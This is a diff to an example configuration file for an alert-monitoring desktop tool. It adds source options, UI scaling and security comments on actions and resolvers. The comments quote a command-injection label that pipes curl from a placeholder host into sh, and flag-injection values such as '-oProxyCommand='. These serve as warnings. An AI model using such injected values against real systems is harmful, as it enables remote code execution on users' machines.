@@ -7,16 +7,31 @@
 #
 # ${ENV_VAR} references are expanded at load time, so secrets can stay
 # in your shell environment or a secrets manager instead of this file.
+#
+# SECURITY: everything Foghorn displays — labels, annotations, generatorURL,
+# incident links — is supplied by the alert source. Treat those values as
+# untrusted input, especially where this config feeds them into `actions` and
+# `resolvers` (see the warnings on those sections below). Prefer https:// source
+# URLs: over plain http anyone on the network path can read your credentials and
+# rewrite alert content, which turns those sections into their problem too.
 
 sources:
   - name: local-alertmanager
     type: alertmanager
+    # Optional. Defaults to true; set false to keep this source in config but
+    # skip polling it and remove it from the UI.
+    enabled: true
     url: http://localhost:9093
     auth:
       type: basic
       username: ${FOGHORN_AM_USER}
       password: ${FOGHORN_AM_PASS}
     poll_interval: 30s
+    # Max time for a single poll of this source (alerts + silences + on-call)
+    # before it is abandoned and recorded as failing. Sources are polled in
+    # parallel, so a slow or broken source never blocks the others; this bounds
+    # how long it shows as "loading". Defaults to 10s when omitted.
+    timeout: 10s
   # - name: oidc-alertmanager
   #   type: alertmanager
   #   url: https://alertmanager.example.com
@@ -236,6 +251,16 @@ notifications:
   on_resolved: false
   batch_threshold: 5
 
+# Actions run on your machine when you trigger them from an alert.
+#
+# SECURITY: action templates interpolate alert fields ({{.Labels.x}},
+# {{.Annotations.x}}, {{.GeneratorURL}}) that come from the alert source.
+#   - `shell` actions run through `sh -c`, so an interpolated alert value is
+#     direct command injection: a label of `; curl evil.example | sh` runs.
+#     Never interpolate alert values into a shell action unless you fully trust
+#     the source *and* quote them; prefer a fixed script that takes the value on
+#     stdin, or use a `url`/`clipboard` action instead.
+#   - `url` actions are limited to http/https/mailto URLs.
 actions: [ ]
 
 resolvers:
@@ -245,6 +270,14 @@ resolvers:
 #
 # Each resolver targets one field reference and executes a local command.
 # The command should print the resolved value to stdout.
+#
+# SECURITY: resolvers run automatically on every poll, with args and env
+# rendered from alert labels/annotations — i.e. from the remote source. There is
+# no shell involved, so there is no command injection, but the values still land
+# in your command's argv: a command that parses flags can be steered by an alert
+# value that starts with `-` (`-oProxyCommand=…`, `--kubeconfig=…`). Point
+# resolvers at a script you control, and have it treat its arguments as data
+# (e.g. read after a literal `--`, or validate before use).
 #
 # Available templates in command/args/env:
 #   {{.Value}}               raw value for the configured field
@@ -329,6 +362,8 @@ ui:
   popup_height: 600
   # Popup corner: top_right, top_left, bottom_right, or bottom_left.
   popup_position: top_right
+  # Automatically position and resize the popup when it opens. Defaults to true.
+  auto_position: true
   # Keep the popup window above all other windows. Defaults to true.
   always_on_top: true
   # macOS only: open the popup on whichever monitor the tray icon was clicked
@@ -338,6 +373,14 @@ ui:
   show_resolved: false
   show_silenced: false
   default_created_by: ${USER}
+  # Optional UI scaling for accessibility. Defaults are a no-op.
+  scale:
+    # Scale factor is clamped to 0.75-2.0.
+    factor: 1.0
+    # fonts scales text only; interface scales the whole web UI.
+    mode: fonts
+    # When mode is interface, resize the popup window with the interface.
+    apply_to_popup: true
   # Silence create/edit dialog. By default only a short whitelist of matchers
   # is shown; the rest collapse behind a "Show N more matchers" toggle. Hidden
   # matchers are still included in the silence — collapsing is purely visual.
